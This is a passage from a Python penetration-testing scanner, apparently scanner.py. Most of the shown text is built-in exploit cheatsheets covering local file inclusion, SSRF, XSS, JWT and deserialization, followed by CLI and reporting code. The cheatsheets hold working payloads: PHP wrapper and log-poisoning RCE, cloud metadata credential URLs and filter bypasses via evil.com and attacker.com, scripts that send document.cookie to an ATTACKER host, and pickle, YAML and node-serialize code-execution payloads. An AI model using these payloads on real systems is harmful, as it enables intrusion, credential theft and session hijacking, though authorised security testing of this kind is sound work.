/var/log/auth.log
~/.ssh/id_rsa
~/.bash_history
/var/www/html/config.php

# Windows
C:\\Windows\\System32\\config\\SAM
C:\\Windows\\System32\\config\\SYSTEM
C:\\Windows\\win.ini
C:\\inetpub\\wwwroot\\web.config
C:\\inetpub\\logs\\LogFiles\\

PHP WRAPPERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Read source code (base64 encoded)
php://filter/convert.base64-encode/resource=index.php

# RCE via expect
expect://id

# RCE via input (POST data contains PHP code)
php://input

# RCE via data
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

LOG POISONING TO RCE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Inject PHP into log: User-Agent: <?php system($_GET['c']); ?>
2. Include the log: ?page=/var/log/apache2/access.log&c=id
""",

    'ssrf': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  SERVER-SIDE REQUEST FORGERY (SSRF) CHEATSHEET                               ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://0/
http://127.1/

CLOUD METADATA:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AWS (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# AWS (IMDSv2 - need token)
curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT http://169.254.169.254/latest/api/token

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/ (with header Metadata-Flavor: Google)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/

BYPASS FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Decimal IP
http://2130706433/ (= 127.0.0.1)

# Hex IP
http://0x7f000001/ (= 127.0.0.1)

# URL encoding
http://127.0.0.1%00@evil.com/
http://evil.com@127.0.0.1/

# DNS rebinding
Use rebinder.io - first request resolves to allowed, second to internal

# Redirect bypass
http://attacker.com/redirect?url=http://169.254.169.254/

PROTOCOL SMUGGLING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall  (Redis)
file:///etc/passwd
dict://127.0.0.1:11211/stats  (Memcached)
""",

    'xss': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  CROSS-SITE SCRIPTING (XSS) CHEATSHEET                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

EVENT HANDLERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<div onmouseover="alert(1)">hover me</div>
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">

BYPASS FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Case variation
<ScRiPt>alert(1)</ScRiPt>

# Without parentheses
<img src=x onerror=alert`1`>

# Without spaces
<svg/onload=alert(1)>

# HTML encoding
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

# URL encoding in javascript:
<a href="javascript:alert(1)">click</a>
<a href="javascript:alert%281%29">click</a>

# Unicode
<script>\\u0061lert(1)</script>

COOKIE STEALING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<script>new Image().src="http://ATTACKER/steal?c="+document.cookie;</script>
<script>fetch('http://ATTACKER/steal?c='+document.cookie)</script>

DOM XSS SOURCES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
document.URL, document.location, document.referrer, window.name
location.hash, location.search, localStorage, sessionStorage
""",

    'jwt': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  JWT (JSON WEB TOKEN) ATTACKS CHEATSHEET                                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

JWT STRUCTURE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
HEADER.PAYLOAD.SIGNATURE
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.xxx

NONE ALGORITHM:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Change header: {"alg":"none"}
2. Modify payload: {"user":"admin","admin":true}
3. Remove signature: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

Variants: none, None, NONE, nOnE

ALGORITHM CONFUSION (RS256 → HS256):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
If server uses RS256 (asymmetric) but accepts HS256 (symmetric):
1. Get the public key
2. Change alg to HS256
3. Sign with public key as secret

SECRET BRUTE FORCE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Using hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# Common weak secrets
secret, password, 123456, jwt_secret, changeme, your-256-bit-secret

KID INJECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Path traversal
{"alg":"HS256","kid":"../../../../../../dev/null"}
# SQL injection
{"alg":"HS256","kid":"1' UNION SELECT 'secret'--"}

TOOLS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
jwt_tool: python3 jwt_tool.py <JWT> -T    # Tamper
jwt_tool: python3 jwt_tool.py <JWT> -X a  # All attacks
jwt.io: Online decoder/encoder
flask-unsign: For Flask session cookies (similar to JWT)
""",

    'deser': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  DESERIALIZATION ATTACKS CHEATSHEET                                          ║
╚══════════════════════════════════════════════════════════════════════════════╝

PHP UNSERIALIZE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Magic methods: __wakeup, __destruct, __toString
# Tools: PHPGGC for gadget chains

phpggc -l                              # List gadgets
phpggc Laravel/RCE1 system 'id'        # Generate payload

PYTHON PICKLE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
import pickle, base64, os

class Payload:
    def __reduce__(self):
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(Payload())).decode())

PYTHON YAML:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
!!python/object/apply:os.system ['id']
!!python/object/new:subprocess.check_output [['id']]

JAVA:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Tools: ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# Common gadgets: CommonsCollections1-7, Spring1, Hibernate1

# Detection: Look for base64 starting with rO0AB (Java serialized)

NODE.JS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# node-serialize RCE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

# Via IIFE
_$$ND_FUNC$$_function(){...}()
""",
}


def print_cheatsheet(topic: str):
    """Print exploitation cheatsheet for given topic."""
    topic = topic.lower()
    
    if topic == 'list':
        print(f"\\n{Colors.BOLD}Available Cheatsheet Topics:{Colors.RESET}\\n")
        topics = {
            'ssti': 'Server-Side Template Injection (Jinja2, Twig, etc.)',
            'sqli': 'SQL Injection (MySQL, PostgreSQL, SQLite)',
            'cmdi': 'Command Injection (Linux/Windows)',
            'lfi': 'Local File Inclusion / Path Traversal',
            'ssrf': 'Server-Side Request Forgery',
            'xss': 'Cross-Site Scripting',
            'jwt': 'JWT Token Attacks',
            'deser': 'Deserialization (PHP, Python, Java, Node)',
        }
        for key, desc in topics.items():
            print(f"  {Colors.BOLD}{key:8}{Colors.RESET} - {desc}")
        print(f"\\n{Colors.DIM}Usage: scanner.py --cheatsheet <topic>{Colors.RESET}\\n")
        return
    
    if topic in CHEATSHEETS:
        print(CHEATSHEETS[topic])
    else:
        print(f"{Colors.CRITICAL}Unknown topic: {topic}{Colors.RESET}")
        print(f"Use --cheatsheet list to see available topics.")


def print_banner():
    """Print the tool banner."""
    banner = f"""
{Colors.BOLD}{Colors.CRITICAL}
   ╔═══════════════════════════════════════════════════════════════╗
   ║    🔒 WEB APP SECURITY SCANNER - Penetration Testing Tool    ║
   ╠═══════════════════════════════════════════════════════════════╣
   ║  Supports: JavaScript, TypeScript, PHP, Python               ║
   ║  Detects vulnerabilities and provides exploitation guidance  ║
   ╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}
   {Colors.DIM}Rules: {ALL_TOTAL_RULES} | Categories: {len(ALL_CATEGORIES)} | Offline Mode{Colors.RESET}
"""
    print(banner)


def main():
    parser = argparse.ArgumentParser(
        description='Multi-Language Security Scanner for Penetration Testing (JS/TS/PHP)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s /path/to/project                    # Scan JS/TS/PHP/Python files
  %(prog)s . --severity HIGH                   # Only HIGH and CRITICAL
  %(prog)s . --output report.json              # Export to JSON
  %(prog)s . --html report.html --csv out.csv  # Export to HTML and CSV
  %(prog)s . --brief                           # Quick summary output
  %(prog)s . --include-vendor                  # Include vendor directories
  %(prog)s . --grep "password|secret|api_key"  # Search for custom patterns
  %(prog)s --cheatsheet ssti                   # Show SSTI exploit cheatsheet
  %(prog)s --list-rules                        # List all detection rules
        '''
    )
    
    parser.add_argument('path', nargs='?', help='Path to scan (file or directory)')
    parser.add_argument('-s', '--severity', choices=['INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL'],
                        default='INFO', help='Minimum severity level to report (default: INFO)')
    parser.add_argument('-o', '--output', help='Export results to JSON file')
    parser.add_argument('--html', help='Export results to HTML report')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Show verbose output including remediation')
    parser.add_argument('--no-exploitation', action='store_true',
                        help='Hide exploitation guidance')
    parser.add_argument('--no-color', action='store_true',
                        help='Disable colored output')
    parser.add_argument('--exclude-rules', help='Comma-separated list of rule IDs to exclude')
    parser.add_argument('-w', '--workers', type=int, default=4,
                        help='Number of parallel workers (default: 4)')
    parser.add_argument('--unminify', action='store_true',
                        help='Auto-detect and unminify minified JS files before scanning')
    parser.add_argument('--include-vendor', action='store_true',
                        help='Include vendor/third-party directories in scan (normally skipped)')
    parser.add_argument('--brief', action='store_true',
                        help='Brief output - show only finding locations without details')
    parser.add_argument('--csv', help='Export results to CSV file')
    parser.add_argument('--grep', metavar='PATTERN',
                        help='Search for custom regex pattern in files (outputs matches with context)')
    parser.add_argument('--cheatsheet', metavar='TOPIC', nargs='?', const='list',
                        help='Show exploit cheatsheet (topics: ssti, sqli, cmdi, lfi, ssrf, xss, jwt, deser, list)')
    parser.add_argument('--list-rules', action='store_true',
                        help='List all available rules and exit')
    
    args = parser.parse_args()
    
    # Cheatsheet mode
    if args.cheatsheet:
        print_cheatsheet(args.cheatsheet)
        return 0
    
    # List rules mode
    if args.list_rules:
        print(f"\n{Colors.BOLD}Available Security Rules ({ALL_TOTAL_RULES} total):{Colors.RESET}\n")
        
        print(f"  {Colors.UNDERLINE}JavaScript/TypeScript Rules ({TOTAL_RULES}):{Colors.RESET}\n")
        for rule in SECURITY_RULES:
            sev_color = SEVERITY_COLORS.get(rule.severity, '')
            print(f"  {sev_color}[{rule.id}]{Colors.RESET} {rule.name}")
            print(f"         Category: {rule.category} | {rule.cwe_id}")
            print()
        
        print(f"\n  {Colors.UNDERLINE}PHP Rules ({PHP_TOTAL_RULES}):{Colors.RESET}\n")
        for rule in PHP_SECURITY_RULES:
            sev_color = SEVERITY_COLORS.get(rule.severity, '')
            print(f"  {sev_color}[{rule.id}]{Colors.RESET} {rule.name}")
            print(f"         Category: {rule.category} | {rule.cwe_id}")
            print()
        
        print(f"\n  {Colors.UNDERLINE}Python Rules ({PYTHON_TOTAL_RULES}):{Colors.RESET}\n")
        for rule in PYTHON_SECURITY_RULES:
            sev_color = SEVERITY_COLORS.get(rule.severity, '')
            print(f"  {sev_color}[{rule.id}]{Colors.RESET} {rule.name}")
            print(f"         Category: {rule.category} | {rule.cwe_id}")
            print()
        return 0
    
    # Validate path is provided
    if not args.path:
        print(f"{Colors.CRITICAL}Error: Path argument is required. Use -h for help.{Colors.RESET}")
        return 1
    
    # Validate path exists
    if not os.path.exists(args.path):
        print(f"{Colors.CRITICAL}Error: Path does not exist: {args.path}{Colors.RESET}")
        return 1
    
    # Grep mode - custom pattern search
    if args.grep:
        all_extensions = SecurityScanner.SUPPORTED_EXTENSIONS
        grep_files(args.path, args.grep, all_extensions, args.include_vendor)
        return 0
    
    print_banner()
    
    # Configure scanner
    config = {
        'min_severity': args.severity,
        'exclude_rules': args.exclude_rules.split(',') if args.exclude_rules else [],
        'unminify': args.unminify,
        'include_vendor': args.include_vendor
    }
    
    # Run scan
    scanner = SecurityScanner(args.path, config)
    result = scanner.scan(max_workers=args.workers)
    
    # Generate reports
    reporter = ReportGenerator()
    use_color = not args.no_color
    
    # Brief mode - minimal output
    if args.brief:
        reporter.print_brief(result, color=use_color)
    else:
        reporter.print_summary(result, color=use_color)
        reporter.print_findings(
            result,
            verbose=args.verbose,
            color=use_color,
            show_exploitation=not args.no_exploitation
        )
    
    # Export if requested
    if args.output:
        reporter.export_json(result, args.output)
    
    if args.html:
        reporter.export_html(result, args.html)
    
    if args.csv:
        reporter.export_csv(result, args.csv)
    
    # Exit code based on findings
    if result.findings_by_severity.get('CRITICAL', 0) > 0:
        return 2
    if result.findings_by_severity.get('HIGH', 0) > 0:
        return 1
    return 0


if __name__ == '__main__':
    sys.exit(main())

